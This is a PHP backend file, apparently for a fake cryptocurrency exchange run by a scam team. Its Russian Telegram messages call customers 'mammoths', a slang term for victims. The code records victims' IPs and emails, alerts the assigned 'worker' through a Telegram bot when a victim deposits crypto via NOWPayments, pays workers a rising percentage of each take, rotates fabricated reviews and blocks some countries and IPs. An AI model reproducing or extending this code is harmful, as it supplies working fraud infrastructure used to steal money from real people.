<?php

include('database.php');


function get_ip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
#ipn_callback_url
function get_kurs($first, $second)
{
    if ($first == 'TRC20' || $first == 'ERC20') {
        $first = 'usdt';
    } 
     
    if ($second == 'TRC20' || $second == 'ERC20') {
        $second = 'usdt';
    }

    $api = api_nowpay;
    $url = 'https://api.nowpayments.io/v1/estimate?amount=1&currency_from=' . $first . '&currency_to=' . $second;

    $options = array(
        'x-api-key: ' . $api
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $options);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

function get_adddress_to_crypto($pay_currency, $price, $order_id)
{
    $api = api_nowpay;
    $url = 'https://api.nowpayments.io/v1/payment';
    $data = json_encode(array('price_amount' => $price, 'price_currency' => $pay_currency, 'pay_currency' => $pay_currency, 'order_id' => $order_id, 'ipn_callback_url' => 'https://' . $_SERVER['HTTP_HOST'] . '/vender/send_nowpay.php'));

    $options = array(
        'x-api-key: ' . $api,
        'Content-Type: application/json'
    );
    // $context  = stream_context_create($options);
    // $result = file_get_contents($url, false, $context);
    // if ($result === FALSE) { /* Handle error */ }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $options);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}



function generation_key()
{
    $comb = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $pass = array();
    $combLen = strlen($comb) - 1;
    for ($i = 0; $i < 12; $i++) {
        $n = rand(0, $combLen);
        $pass[] = $comb[$n];
    }
    return implode($pass);
}

function partners($ref)
{
    $users = get_user_ref($ref);
    $partners_array = [];
    while ($user = $users->fetch_array()) {
        $count_exchange = get_count_ref($user['mail']);
        $partners_array = array_merge($partners_array, [['email' => $user['mail'], 'data' => $user['data'], 'count' => $count_exchange]]);
    }



    return $partners_array;
}

// function check_mamont_ip(){
//     $ip = get_ip();
//     $mamont = get_mamont_by_ip($ip);
//     if($mamont == null){
//         create_mamont($ip);
//     }
// }

// function chek_payment_crypto($id_pay){
//     $url = 'https://api.nowpayments.io/v1/payment/'.$id_pay;

//     $headers = ['x-api-key: '.api_nowpay]; 

//     $curl = curl_init(); 

//     curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//     curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
//     curl_setopt($curl, CURLOPT_VERBOSE, 1); 
//     curl_setopt($curl, CURLOPT_POST, false); //
//     curl_setopt($curl, CURLOPT_URL, $url);

//     $result = curl_exec($curl);
//     $result = json_decode(json_encode(json_decode($result)), true);
//     return $result['payment_status'];
// }

function send_exchange_admin($order, $type)
{
    $method = 'sendMessage';
    $coin_from = get_coin_by_id($order['id_coin_from']);
    $coin_to = get_coin_by_id($order['id_coin_to']);
    $worker = get_user_by_key($order['key']);
    $text = "⚠️ Оплачено ⚠️\n\n🔔 IP: {$order['ip']}\n🆔 Уникальный ID: {$order['id']}\n🦣 Почта мамонта: {$order['mail']}\n💸 Сумма: {$order['summ_from']} {$coin_from['sign']}\n😏 Получает: {$order['summ_to']} {$coin_to['sign']}\n💼 Адрес: {$order['address']}\n\n";
    if ($worker != null) {
        $text .= "Айди воркера: {$worker['id']}\nЛинк воркера: @{$worker['username']}\n\n🔽 Что делаем? 🔽";
    } else {
        $text .= "🔽 Что делаем? 🔽";
    }
    $send_data = [
        'text' => $text,
        'reply_markup' => ['inline_keyboard' => [[['text' => 'Подтвердить', 'callback_data' => "exchange:done:{$type}:{$order['id']}"], ['text' => 'Отменить', 'callback_data' => "exchange:cancel:{$type}:{$order['id']}"]], [['text' => 'Заблокировать', 'callback_data' => "block_exchange:{$order['id']}"]]]]
    ];
    $send_data['chat_id'] = admin_chat;
    $res = sendTG($method, $send_data);
}



function sendTG($method, $data, $headers = [])
{
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_POST => 1,
        CURLOPT_HEADER => 0,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_URL => 'https://api.telegram.org/bot' . TOKEN . '/' . $method,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_HTTPHEADER => array_merge(array("Content-Type: application/json"), $headers)
    ]);

    $result = curl_exec($curl);
    curl_close($curl);
    return (json_decode($result, 1) ? json_decode($result, 1) : $result);
}

function new_mamont_send_worker($key)
{
    $user = get_user_by_key($key);
    $ip = get_ip();
    $text = "🦣 Новый мамонт 🦣\n⚙️ IP: {$ip}";
    $method = 'sendMessage';
    $send_data = [
        'text' => $text
    ];
    if ($user != null) {
        $send_data['chat_id'] = $user['id'];
    } else {
        $send_data['chat_id'] = admin_chat;
    }
    $res = sendTG($method, $send_data);
}

function new_exchange_send_worker($key, $summ_from, $sign_from, $summ_to, $sign_to)
{
    $user = get_user_by_key($key);
    $ip = get_ip();
    $text = "🦣 Мамонт создал обмен 🦣\n⚙️ IP: {$ip}\n💸 Перевод: {$summ_from} {$sign_from} - {$summ_to} {$sign_to}";
    $method = 'sendMessage';
    $send_data = [
        'text' => $text
    ];
    if ($user != null) {
        $send_data['chat_id'] = $user['id'];
    } else {
        $send_data['chat_id'] = admin_chat;
    }
    $res = sendTG($method, $send_data);
}

function get_coin_dict()
{
    $coins = get_exchange();
    $coin_dict = [];
    $file_admin = file_get_contents($_SERVER['DOCUMENT_ROOT'] . "/bot/admin.json");
    $json_a = json_decode($file_admin, true);
    $defolt_procent = $json_a['procent'];
    while ($coin = $coins->fetch_array()) {
        if ($coin['procent'] == null) {
            $coin_dict = array_merge($coin_dict, [$coin['name'] => ['type' => $coin['type'], 'min' => $coin['min'], 'max' => $coin['max'], 'procent' => $defolt_procent]]);
        } else {
            $coin_dict = array_merge($coin_dict, [$coin['name'] => ['type' => $coin['type'], 'min' => $coin['min'], 'max' => $coin['max'], 'procent' => $coin['procent']]]);
        }
    }

    return json_encode($coin_dict);
}


function get_defolt_address()
{
    $file_admin = file_get_contents($_SERVER['DOCUMENT_ROOT'] . "/bot/admin.json");
    $json_a = json_decode($file_admin, true);

    $address = $json_a["address"];

    return $address;
}

function check_ip()
{
    include("SxGeo.php");

    $ip = get_ip();

    $SxGeo = new SxGeo($_SERVER['DOCUMENT_ROOT'] . '/vender/SxGeo.dat');
    // получаем двухзначный ISO-код страны (RU, UA и др.)
    $country_code = $SxGeo->getCountry($ip);
    $block = get_block_country_code($country_code);
    if ($block == null) {
        $block_user = get_block_mamont_ip($ip);
        if ($block_user == null) {
            return true;
        } else {
            return false;
        }
    } else {
        return false;
    }
}

function check_exchange_block()
{
    $create_date = date("d.m.y H:i");
    $count_exchange = get_exchange_by_data($create_date);
    if ($count_exchange == 4) {
        $ip = get_ip();
        add_ip_block($ip);
        return false;
    } else {
        return true;
    }
}

function check_review()
{
    $today_date = date("d.m.y");
    $first_review = get_review_show(1);
    if ($first_review['data'] != $today_date) {
        $count = get_count_review();
        // update_show_review($last_review['id'], 1);
        // update_show_review($first_review['id'], $last_review['show']);
        // update_data_first_review($last_review['id'], $today_date);
        $all_reviews = get_all_reviews();
        while ($review = $all_reviews->fetch_array()) {
            $show = $review['show'] - 1;
            if ($show == 0) {
                update_show_review($review['id'], $count);
            } elseif ($show == 1) {
                update_show_review($review['id'], $show);
                update_data_first_review($review['id'], $today_date);
            } else {
                update_show_review($review['id'], $show);
            }
        }
    }
}

function accept_payment($id_order)
{
    $order = get_exchange_id($id_order);
    if ($order['key'] != 'None') {
        $worker = get_user_by_key($order['key']);

        $coin_from = get_coin_by_id($order['id_coin_from']);
        $kurs = json_decode(get_kurs($coin_from['sign'], 'USD'), true);
        $summ_all = round((float) $order['summ_from'] * $kurs['estimated_amount'], 0);
        $count_exchange_worker = get_count_exchange_worker($order['key'], $order['ip'], 'finished');

        $file_admin = file_get_contents($_SERVER['DOCUMENT_ROOT'] . "/bot/admin.json");
        $json_a = json_decode($file_admin, true);

        if ($count_exchange_worker == 1) {
            $procent = $json_a['first_proc'];
        } elseif ($count_exchange_worker == 2) {
            $procent = $json_a['second_proc'];
        } else {
            $procent = $json_a['three_proc'];
        }

        //                 $prcie = (float) $exchange['summ_from'];
        $summ = round($summ_all * ((int) $procent / 100), 0);


        change_balance_user($worker['id'], $worker['balance'] + $summ);
        change_balance_all_user($worker['id'], $worker['balance_all'] + $summ);
        $method = 'sendMessage';
        $send_data = [
            'text' => "💸 Сумма: {$summ_all}$\n🔱 Процент: {$procent}%\n🧑‍💻 Воркер: @{$worker['username']}",
            'chat_id' => payments_channel
        ];
        $res = sendTG($method, $send_data);
    }
}
